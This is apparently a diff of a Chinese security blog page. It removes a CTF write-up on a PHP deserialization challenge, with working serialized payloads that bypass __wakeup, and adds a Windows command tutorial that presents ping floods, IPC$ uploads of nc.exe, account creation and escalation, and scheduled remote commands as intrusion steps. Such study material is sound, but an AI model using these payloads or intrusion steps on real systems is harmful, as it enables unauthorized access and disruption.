@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web13-PHP序列化与反序列化, lunan">
+    <meta name="keywords" content="DOS命令详解, lunan">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Web13-PHP序列化与反序列化 | lunan</title>
+    <title>DOS命令详解 | lunan</title>
     <link rel="icon" type="image/png" href="/lunan0320.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/lunan0320.github.io/libs/awesome/css/all.css">
@@ -262,12 +262,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Web13-PHP序列化与反序列化</h1>
+                    <h1 class="description center-align post-title">DOS命令详解</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +383,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/lunan0320.github.io/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/lunan0320.github.io/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
                             </a>
                         
                     </div>
@@ -399,28 +399,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-02-12
+                    2021-02-28
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-14
+                    2021-02-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    8 分
                 </div>
                 
 
@@ -440,106 +440,57 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1><span id="web13-php序列化与反序列化">Web13-PHP序列化与反序列化</span></h1><p>参考文献：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46383107/article/details/109770976">浅谈反序列漏洞</a></p>
-<p>1、<strong>目录扫描</strong>，使用目录扫描工具dirsearch，扫出来一个<a target="_blank" rel="noopener" href="http://www.zip的文件,download./">www.zip的文件，download。</a></p>
-<pre class=" language-php"><code class="language-php">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//fd524dc7-eca6-4d21-b9c6-f168d37e3951.node3.buuoj.cn/ -e * -w db/dir.txt</span></code></pre>
-<p>2、查看flag.php，发现是个假的flag,因此查看index.php,查看其中的php代码，发现是<strong>文件包含的时候，进行了反序列化的过程</strong>，传入一个select的参数，进行反序列化的过程</p>
-<p><img src="/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/1.png"></p>
-<p>3、查看class.php，<strong>代码审计</strong>，我们要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
-<p><img src="/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/2.png"></p>
+                <h1><span id="dos命令">DOS命令</span></h1><h3><span id="一-dos概述">一、DOS概述</span></h3><p>DOS（Disk Operating System  即磁盘操作系统）命令是指DOS操作系统的命令，是一种<strong>面向磁盘的操作命令</strong>，主要包括目录操作类命令、磁盘操作类命令、文件操作类命令和其它命令。</p>
+<p>​    大家常用的操作系统有windows10,windows 7等，都是图形化的界面。在有这些系统之前的人们使用的操作系统是DOS系统。</p>
+<h3><span id="二-基本命令">二、基本命令</span></h3><h4><span id="1-ping">1、ping</span></h4><p>​    Ping 命令是专用于TCP/IP 协议的探测工具，它对测试网络连接状况以及信息包发送和接收状况非常有用，这是TCP/IP 协议中最有用的命令之一。它给另一个系统发送一系列的数据包，该系统本身又发回一个响应，这条实用程序对查找远程主机很有用，它返回的结果表示是否能到达主机，宿主机发送一个返回数据包需要多长时间。</p>
+<p>​    <strong>-t 表示将不间断向目标IP发送数据包，直到我们强迫其停止</strong>。试想，如果你使用100M的宽带接入，而目标IP是56K的小猫，那么要不了多久，目标IP就因为承受不了这么多的数据而掉线，呵呵，一次攻击就这么简单的实现了。</p>
+<p>​    <strong>-l 定义发送数据包的大小，默认为32字节，</strong>我们利用它可以最大定义到65500字节。结合上面介绍的-t参数一起使用，会有更好的效果。</p>
+<p>​    -<strong>n 定义向目标IP发送数据包的次数，默认为3次。</strong>如果网速比较慢，3次对我们来说也浪费了不少时间，因为我们的目的仅仅是判断目标IP是否存在，那么就定义为一次吧。</p>
 <blockquote>
-<p><strong>魔法函数</strong><br> 通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：<br> __construct 当一个对象创建时自动调用<br> __destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)<br> __sleep() 使<strong>用serialize()**函数时触发<br> __wakeup 使</strong>用unserialse()**函数时会自动调用<br> __toString 当一个对象被当作一个字符串被调用。<br> __call() 在对象上下文中调用不可访问的方法时触发<br> __callStatic() 在静态上下文中调用不可访问的方法时触发<br> __get() 用于从不可访问的属性读取数据//调用私有属性时使用<br> __set() 用于将数据写入不可访问的属性<br> __isset() 在不可访问的属性上调用isset()或empty()触发<br> __unset() 在不可访问的属性上使用unset()时触发<br> __toString() 把类当作字符串使用时触发,返回值需要为字符串<br> __invoke() 当脚本尝试将对象调用为函数时触发</p>
+<p>说明一下，如果-t 参数和 -n参数一起使用，ping命令就以放在后面的参数为标准，比如“ping IP -t -n 3”，虽然使用了-t参数，但并不是一直ping下去，而是只ping 3次。另外，ping命令不一定非得ping IP，也可以直接ping主机域名，这样就可以得到主机的IP。</p>
 </blockquote>
-<p>4、构造test.php代码，即可得到序列化的结果。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
-    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-<span class="token punctuation">}</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>5、序列化后，运行apache服务器，在本地执行test.php得到结果。</p>
-<p>在反序列化的时候会首先执行__wakeup()魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过__wakeup()，而去执行__destruct</p>
-<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<p><img src="/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/3.png"></p>
-<p>6、绕过<code>__wakeup</code>这个魔术函数，利用<strong>反序列化漏洞</strong>，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p>
+<h4><span id="2-nbtstat">2、nbtstat</span></h4><p>​    该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接，使用这个命令你可以得到远程主机的NETBIOS信息，比如用户名、所属的工作组、网卡的MAC地址等。在此我们就有必要了解几个基本的参数。</p>
+<p>​    <strong>-a</strong> 使用这个参数，只要你知道了远程主机的机器名称，就可以得到<strong>它的NETBIOS信息</strong>（下同）。</p>
+<p>​    <strong>-A</strong> 这个参数也可以得到<strong>远程主机的NETBIOS信息，但需要你知道它的IP</strong>。</p>
+<p>​    <strong>-n</strong> 列出<strong>本地机器的NETBIOS信息</strong>。</p>
+<p>​    当得到了对方的IP或者机器名的时候，就可以使用nbtstat命令来进一步得到对方的信息了，这又增加了我们入侵的保险系数。</p>
+<h4><span id="3-netstat">3、netstat</span></h4><p>​    这是一个用来<strong>查看网络状态</strong>的命令，操作简便功能强大。</p>
+<p>​    <strong>-a 查看本机的所有开放端口</strong>，可以有效发现和预防木马，可以知道机器所开的服务等信息，如图4。</p>
+<p>​    这里可以看出本地机器开放有FTP服务、Telnet服务、邮件服务、WEB服务等。用法：netstat -a IP。</p>
+<p>​    <strong>-r 列出当前的路由信息</strong>，告诉我们本地机器的网关、子网掩码等信息。用法：netstat -r IP。</p>
+<h4><span id="4-net">4、net</span></h4><p>​    这个命令是网络命令中最重要的一个，必须透彻掌握它的每一个子命令的用法，因为它的功能实在是太强大了　在这里，我们重点掌握几个常用的子命令。</p>
+<p>​    <strong>net view，使用此命令查看远程主机的所有共享资源</strong>。命令格式为net view \IP。</p>
+<p>​    <strong>net use，把远程主机的某个共享资源影射为本地盘符</strong>，图形界面方便使用。命令格式为net use x: \IP\sharename。上面一个表示把192.168.0.5IP的共享名为magic的目录影射为本地的Z盘。下面表示和192.168.0.7建立IPC$连接（net use $”&gt;\IP\IPC$ “password” /user:”name”），</p>
+<p>​    建立了IPC$连接后，呵呵，就可以上传文件了：copy nc.exe $”&gt;\192.168.0.7\admin$，表示把本地目录下的nc.exe传到远程主机，结合后面要介绍到的其他DOS命令就可以实现入侵了。</p>
+<p>​    <strong>net start，使用它来启动远程主机上的服务。</strong>当你和远程主机建立连接后，如果发现它的什么服务没有启动，而你又想利用此服务怎么办？就使用这个命令来启动吧。用法：net start servername，如图9，成功启动了telnet服务。</p>
+<p>​    <strong>net stop</strong>入侵后发现远程主机的某个服务碍手碍脚，怎么办？利用这个命令停掉就ok了，用法和net start同。</p>
+<p>​    <strong>net user</strong></p>
+<p>​    查看和帐户有关的情况，包括新建帐户、删除帐户、查看特定帐户、激活帐户、帐户禁用等。这对我们入侵是很有利的，最重要的，它为我们克隆帐户提供了前提。键入不带参数的net user，可以查看所有用户，包括已经禁用的。下面分别讲解。</p>
 <blockquote>
-<p><strong>__wakeup()方法</strong></p>
-<p><strong>作用：</strong></p>
-<p>与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。</p>
-<p><strong>绕过：</strong></p>
-<p>反序列化字符串，当属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</p>
+<p>1，net user abcd 1234 /add，新建一个用户名为abcd，密码为1234的帐户，默认为user组成员。</p>
+<p>2，net user abcd /del，将用户名为abcd的用户删除。</p>
+<p>3，net user abcd /active:no，将用户名为abcd的用户禁用。</p>
+<p>4，net user abcd /active:yes，激活用户名为abcd的用户。</p>
+<p>5，net user abcd，查看用户名为abcd的用户的情况</p>
 </blockquote>
-<p>本题中，wakeup方法会导致username成为guest，因此需要通过改序列化字符串中对象的个数来绕过该方法。</p>
-<p>name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。</p>
-<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<p>7、又因为这个声明变量是private，private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
-<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<p>8、使用GET请求，把准备好的序列化作为select的参数传入，然后url识别不了<code>"</code>，改为<code>%22</code></p>
-<pre class=" language-python"><code class="language-python"><span class="token operator">%</span><span class="token number">00</span> 
-不可见的空字符（Null） ASCII码十进制为<span class="token number">0</span>
-
-<span class="token operator">%</span><span class="token number">20</span>
-空格</code></pre>
-<pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>select<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span>22Name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00Name<span class="token operator">%</span>00username<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">%</span>22admin<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00Name<span class="token operator">%</span>00password<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<p>9、得到flag：<strong>flag{b46c16d0-eb8d-4bca-a4ac-a9737a7f9d50</strong></p>
-<p>10、拓展：<strong>为什么要写%00Name%00username这样的形式？</strong></p>
-<blockquote>
-<p>只有public修饰的不用太多的修饰原生态构造就好</p>
-<p>private需要加**%00Name%00**，</p>
-<p>protected则需要使用   <strong>%00*%00username</strong>这样的方式</p>
-</blockquote>
-<h3><span id="protected修饰变量运行后回显代码内注释内容">protected修饰变量，运行后回显代码内注释内容</span></h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
-    <span class="token keyword">protected</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>看这两行
-    <span class="token keyword">protected</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token comment" spellcheck="true">//运行会输出 O:4:"Name":2:{s:11:"%00*%00username";s:5:"admin";s:11:"%00*%00password";i:100;}</span>
-<span class="token delimiter">?></span></code></pre>
-<h3><span id="public修饰变量运行后回显代码内注释内容">public修饰变量，运行后回显代码内注释内容</span></h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token comment" spellcheck="true">//O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";i:100;}</span>
-<span class="token delimiter">?></span></code></pre>
-<h3><span id="private修饰变量运行后回显代码内注释内容">private修饰变量，运行后回显代码内注释内容</span></h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
-    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token comment" spellcheck="true">//O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00 password";i:100;}</span>
-<span class="token delimiter">?></span></code></pre>
+<p>​    net localgroup　查看所有和用户组有关的信息和进行相关操作。键入不带参数的net localgroup即列出当前所有的用户组。在入侵过程中，我们一般利用它来把某个帐户提升为administrator组帐户，这样我们利用这个帐户就可以控制整个远程<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>了。</p>
+<p>​    <strong>net time</strong></p>
+<p>​    这个命令可以查看远程主机当前的时间。如果你的目标只是进入到远程主机里面，那么也许就用不到这个命令了。但简单的入侵成功了，难道只是看看吗？我们需要进一步渗透。这就连远程主机当前的时间都需要知道，因为利用时间和其他手段（后面会讲到）可以实现某个命令和程序的定时启动，为我们进一步入侵打好基础。用法：net time \IP。</p>
+<h4><span id="5-at">5、at</span></h4><p>​    这个命令的作用是安排在特定日期或时间执行某个特定的命令和程序（知道net time的重要了吧？）。当我们知道了远程主机的当前时间，就可以利用此命令让其在以后的某个时间（比如2分钟后）执行某个程序和命令。用法：at time command \computer。</p>
+<p>​    表示在6点55分时，让名称为a-01的计算机开启telnet服务（这里net start telnet即为开启telnet服务的命令）。</p>
+<h4><span id="6-ftp">6、ftp</span></h4><p>​    首先在命令行键入ftp回车，出现ftp的提示符，这时候可以键入“help”来查看帮助（任何DOS命令都可以使用此方法查看其帮助）。</p>
+<p>​    首先是登陆过程，这就要用到open了，直接在ftp的提示符下输入“open 主机IP ftp端口”回车即可，一般端口默认都是21，可以不写。接着就是输入合法的用户名和密码进行登陆了，这里以匿名ftp为例介绍。</p>
+<p>​    用户名和密码都是ftp，密码是不显示的。当提示**** logged in时，就说明登陆成功。这里因为是匿名登陆，所以用户显示为Anonymous。　接下来就要介绍具体命令的使用方法了。</p>
+<p>​    <strong>dir</strong> 跟DOS命令一样，用于查看服务器的文件，直接敲上dir回车，就可以看到此ftp服务器上的文件。</p>
+<p>​    <strong>cd</strong> 进入某个文件夹。</p>
+<p>​    <strong>get</strong> 下载文件到本机。</p>
+<p>​    <strong>put</strong> 上传文件到远程服务器。这就要看远程ftp服务器是否给了你可写的权限。</p>
+<p>​    <strong>delete</strong> 删除远程ftp服务器上的文件。这也必须保证你有可写的权限。</p>
+<p>​    <strong>bye</strong> 退出当前连接。</p>
+<p>​    <strong>quit</strong> 同上。</p>
+<h4><span id="7-telnet">7、telnet</span></h4><p>​    功能强大的远程登录命令，几乎所有的入侵者都喜欢用它，屡试不爽。为什么？它操作简单，如同使用自己的机器一样，只要你熟悉DOS命令，在成功以administrator身份连接了远程机器后，就可以用它来干想干的一切了。下面介绍一下使用方法，首先键入telnet回车，再键入help查看其帮助信息。</p>
+<p>​    然后在提示符下键入open IP回车，这时就出现了登陆窗口，让你输入合法的用户名和密码，这里输入任何密码都是不显示的。</p>
+<p>​    当输入用户名和密码都正确后就成功建立了telnet连接，这时候你就在远程主机上具有了和此用户一样的权限，利用DOS命令就可以实现你想干的事情了。这里我使用的超级管理员权限登陆的。</p>
 
                 
             </div>
@@ -566,7 +517,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/">https://lunan0320.github.io/lunan0320.github.io/2021/02/12/web13-php-xu-lie-hua-yu-fan-xu-lie-hua/</a>
+                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/02/28/dos-ming-ling-xiang-jie/">https://lunan0320.github.io/lunan0320.github.io/2021/02/28/dos-ming-ling-xiang-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -604,8 +555,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/lunan0320.github.io/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/lunan0320.github.io/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
                                 </a>
                             
                         </div>
@@ -649,17 +600,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/02/22/web14-wen-jian-shang-chuan-lou-dong/">
+                <a href="/lunan0320.github.io/2021/02/28/dos-ming-ling-xiang-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/18.jpg" class="responsive-img" alt="Web14-文件上传漏洞">
+                        <img src="/lunan0320.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="DOS命令详解">
                         
-                        <span class="card-title">Web14-文件上传漏洞</span>
+                        <span class="card-title">DOS命令详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -669,9 +621,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -680,11 +632,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/lunan0320.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/lunan0320.github.io/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
                     </a>
                     
                 </div>
@@ -698,13 +651,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/02/11/web12-http/">
+                <a href="/lunan0320.github.io/2021/02/28/web15-backfile-bei-fen-wen-jian/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="Web12-HTTP">
+                        <img src="/lunan0320.github.io/medias/featureimages/11.jpg" class="responsive-img" alt="Web15-BackFile备份文件">
                         
-                        <span class="card-title">Web12-HTTP</span>
+                        <span class="card-title">Web15-BackFile备份文件</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -715,7 +668,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-28
                             </span>
                         <span class="publish-author">
                             
